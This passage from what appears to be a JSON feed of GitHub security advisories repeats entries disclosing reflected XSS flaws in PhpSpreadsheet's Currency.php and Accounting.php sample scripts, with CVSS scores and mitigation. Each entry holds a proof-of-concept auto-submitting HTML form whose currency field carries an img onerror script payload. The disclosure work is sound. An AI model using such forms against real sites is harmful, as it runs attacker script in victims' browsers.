id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Currency.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file, which leads to the possibility of a XSS attack.\nStrings are formed using the <code>currency</code> parameter without sanitization, controlled by an attacker.</p>\n<p><img alt=\"fig9\" src=\"https://github.com/user-attachments/assets/dfac3fbf-de42-42af-8163-b76f0c54da6c\"></p>\n<p><em>Figure 9.  A fragment of the query in which a string and a parameter are formed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 5. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"number\" value=\"1234&amp;#46;5678\" /&gt;\n      &lt;input type=\"hidden\" name=\"currency\" value=\"&amp;#36;&amp;apos;&amp;quot;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"decimals\" value=\"2\" /&gt;\n      &lt;input type=\"hidden\" name=\"position\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"spacing\" value=\"0\" /&gt;\n      &lt;input type=\"hidden\" name=\"submit\" value=\"Display&amp;#32;Mask\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure 10 shows the execution of arbitrary JavaScript code during the submission of a POST form. </p>\n<img src=\"https://github.com/user-attachments/assets/2be8c94b-03ac-40d9-aa7a-9d326eb79335\" alt=\"fig10\" width=\"428\">\n\n<p><em>Figure 10. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56409\">https://nvd.nist.gov/vuln/detail/CVE-2024-56409</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j2xg-cjcx-4677\">https://github.com/advisories/GHSA-j2xg-cjcx-4677</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j2xg-cjcx-4677",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file",
            "date_modified": "2025-01-03T19:17:19.000Z",
            "date_published": "2025-01-03T17:06:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j2xg-cjcx-4677"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-currencyphp-file\">Unauthorized Reflected XSS in <code>Currency.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> script, an attacker can perform XSS-type attack\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the <code>currency</code> variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Currency.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file, which leads to the possibility of a XSS attack.\nStrings are formed using the <code>currency</code> parameter without sanitization, controlled by an attacker.</p>\n<p><img alt=\"fig9\" src=\"https://github.com/user-attachments/assets/dfac3fbf-de42-42af-8163-b76f0c54da6c\"></p>\n<p><em>Figure 9.  A fragment of the query in which a string and a parameter are formed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 5. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"number\" value=\"1234&amp;#46;5678\" /&gt;\n      &lt;input type=\"hidden\" name=\"currency\" value=\"&amp;#36;&amp;apos;&amp;quot;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"decimals\" value=\"2\" /&gt;\n      &lt;input type=\"hidden\" name=\"position\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"spacing\" value=\"0\" /&gt;\n      &lt;input type=\"hidden\" name=\"submit\" value=\"Display&amp;#32;Mask\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure 10 shows the execution of arbitrary JavaScript code during the submission of a POST form. </p>\n<img src=\"https://github.com/user-attachments/assets/2be8c94b-03ac-40d9-aa7a-9d326eb79335\" alt=\"fig10\" width=\"428\">\n\n<p><em>Figure 10. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56409\">https://nvd.nist.gov/vuln/detail/CVE-2024-56409</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j2xg-cjcx-4677\">https://github.com/advisories/GHSA-j2xg-cjcx-4677</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j2xg-cjcx-4677",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file",
            "date_modified": "2025-01-03T19:17:19.000Z",
            "date_published": "2025-01-03T17:06:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j2xg-cjcx-4677"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-currencyphp-file\">Unauthorized Reflected XSS in <code>Currency.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> script, an attacker can perform XSS-type attack\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the <code>currency</code> variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Currency.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file, which leads to the possibility of a XSS attack.\nStrings are formed using the <code>currency</code> parameter without sanitization, controlled by an attacker.</p>\n<p><img alt=\"fig9\" src=\"https://github.com/user-attachments/assets/dfac3fbf-de42-42af-8163-b76f0c54da6c\"></p>\n<p><em>Figure 9.  A fragment of the query in which a string and a parameter are formed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 5. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"number\" value=\"1234&amp;#46;5678\" /&gt;\n      &lt;input type=\"hidden\" name=\"currency\" value=\"&amp;#36;&amp;apos;&amp;quot;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"decimals\" value=\"2\" /&gt;\n      &lt;input type=\"hidden\" name=\"position\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"spacing\" value=\"0\" /&gt;\n      &lt;input type=\"hidden\" name=\"submit\" value=\"Display&amp;#32;Mask\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure 10 shows the execution of arbitrary JavaScript code during the submission of a POST form. </p>\n<img src=\"https://github.com/user-attachments/assets/2be8c94b-03ac-40d9-aa7a-9d326eb79335\" alt=\"fig10\" width=\"428\">\n\n<p><em>Figure 10. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56409\">https://nvd.nist.gov/vuln/detail/CVE-2024-56409</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j2xg-cjcx-4677\">https://github.com/advisories/GHSA-j2xg-cjcx-4677</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j2xg-cjcx-4677",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file",
            "date_modified": "2025-01-03T19:17:19.000Z",
            "date_published": "2025-01-03T17:06:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j2xg-cjcx-4677"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-currencyphp-file\">Unauthorized Reflected XSS in <code>Currency.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> script, an attacker can perform XSS-type attack\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the <code>currency</code> variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Currency.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file, which leads to the possibility of a XSS attack.\nStrings are formed using the <code>currency</code> parameter without sanitization, controlled by an attacker.</p>\n<p><img alt=\"fig9\" src=\"https://github.com/user-attachments/assets/dfac3fbf-de42-42af-8163-b76f0c54da6c\"></p>\n<p><em>Figure 9.  A fragment of the query in which a string and a parameter are formed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 5. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"number\" value=\"1234&amp;#46;5678\" /&gt;\n      &lt;input type=\"hidden\" name=\"currency\" value=\"&amp;#36;&amp;apos;&amp;quot;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"decimals\" value=\"2\" /&gt;\n      &lt;input type=\"hidden\" name=\"position\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"spacing\" value=\"0\" /&gt;\n      &lt;input type=\"hidden\" name=\"submit\" value=\"Display&amp;#32;Mask\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure 10 shows the execution of arbitrary JavaScript code during the submission of a POST form. </p>\n<img src=\"https://github.com/user-attachments/assets/2be8c94b-03ac-40d9-aa7a-9d326eb79335\" alt=\"fig10\" width=\"428\">\n\n<p><em>Figure 10. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56409\">https://nvd.nist.gov/vuln/detail/CVE-2024-56409</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j2xg-cjcx-4677\">https://github.com/advisories/GHSA-j2xg-cjcx-4677</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j2xg-cjcx-4677",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file",
            "date_modified": "2025-01-03T19:17:19.000Z",
            "date_published": "2025-01-03T17:06:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j2xg-cjcx-4677"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-the-accountingphp-file\">Unauthorized Reflected XSS in the <code>Accounting.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> script, an attacker can perform a XSS-type attack\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the currency variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Accounting.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file, which leads to the possibility of a XSS attack.\nStrings are formed using the currency parameter without sanitization, which is controlled by the attacker.</p>\n<p><img alt=\"fig7\" src=\"https://github.com/user-attachments/assets/da0ee52d-2306-4770-a61d-bce4ba553f4f\"></p>\n<p><em>Figure 7. A fragment of the query in which a string and a parameter are formed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 4. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"number\" value=\"1234&amp;#46;5678\" /&gt;\n      &lt;input type=\"hidden\" name=\"currency\" value=\"&amp;#36;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"decimals\" value=\"2\" /&gt;\n      &lt;input type=\"hidden\" name=\"position\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"spacing\" value=\"0\" /&gt;\n      &lt;input type=\"hidden\" name=\"submit\" value=\"Display&amp;#32;Mask\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After sending the script provided in Listing 4, the XSS vulnerability is exploited. Figure 8 shows the execution of arbitrary JavaScript code during the submission of a POST form.</p>\n<img src=\"https://github.com/user-attachments/assets/b009256e-61f7-4d72-8f6a-cc6e0efe2bb1\" alt=\"fig8\" width=\"460\">\n\n<p><em>Figure 8. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56366\">https://nvd.nist.gov/vuln/detail/CVE-2024-56366</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c6fv-7vh8-2rhr\">https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c6fv-7vh8-2rhr",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in the Accounting.php file",
            "date_modified": "2025-01-03T19:17:02.000Z",
            "date_published": "2025-01-03T17:06:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c6fv-7vh8-2rhr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-the-accountingphp-file\">Unauthorized Reflected XSS in the <code>Accounting.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> script, an attacker can perform a XSS-type attack\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the currency variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Accounting.php</code> file) in Phpspreadsheet.</p>\n<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php</code> file, which leads to the possibility of a XSS attack.\nStrings are formed using the currency parameter without sanitization, which is controlled by the attacker.</p>\n<p><img alt=\"fig7\" src=\"https://github.com/user-attachments/assets/da0ee52d-2306-4770-a61d-bce4ba553f4f\"></p>\n<p><em>Figure 7. A fragment of the query in which a string and a parameter are formed without sanitization</em></p>\n<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>\n<p><em>Listing 4. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"number\" value=\"1234&amp;#46;5678\" /&gt;\n      &lt;input type=\"hidden\" name=\"currency\" value=\"&amp;#36;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"decimals\" value=\"2\" /&gt;\n      &lt;input type=\"hidden\" name=\"position\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"spacing\" value=\"0\" /&gt;\n      &lt;input type=\"hidden\" name=\"submit\" value=\"Display&amp;#32;Mask\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>After sending the script provided in Listing 4, the XSS vulnerability is exploited. Figure 8 shows the execution of arbitrary JavaScript code during the submission of a POST form.</p>\n<img src=\"https://github.com/user-attachments/assets/b009256e-61f7-4d72-8f6a-cc6e0efe2bb1\" alt=\"fig8\" width=\"460\">\n\n<p><em>Figure 8. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4\">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56366\">https://nvd.nist.gov/vuln/detail/CVE-2024-56366</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c6fv-7vh8-2rhr\">https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c6fv-7vh8-2rhr",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in the Accounting.php file",
            "date_modified": "2025-01-03T19:17:02.000Z",
            "date_published": "2025-01-03T17:06:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c6fv-7vh8-2rhr"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}